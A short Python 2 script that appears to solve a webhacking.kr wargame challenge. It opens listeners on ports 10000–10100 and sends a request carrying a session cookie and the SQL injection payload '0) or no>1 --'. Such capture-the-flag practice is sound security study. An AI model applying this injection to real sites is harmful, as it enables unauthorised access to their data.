#-*- coding: utf-8 -*-
import socket
import sys
import threading
import time
import urllib
import urllib2

import CookieManager


def getPassword(portNumber):
    serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serverSocket.bind(('', portNumber))
    serverSocket.listen(1)
    conn, _ = serverSocket.accept()
    print conn.recv(1024)
    if serverSocket != None:
        serverSocket.close()
    sys.exit(0)

for portNumber in range(10000, 10101):
    t = threading.Thread(target=getPassword, args=(portNumber, ))
    t.start()

challengeUrl = "http://webhacking.kr/challenge/web/web-16/"
CookieManager.addCookie("PHPSESSID", "a51840b57e5b3e4fb1af134b4054c3a1")

parameter = urllib.quote("0) or no>1 --")
httpRequest = urllib2.Request(challengeUrl + "?no=" + parameter)
httpRequest.add_header("Cookie", CookieManager.getCookie())

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
    
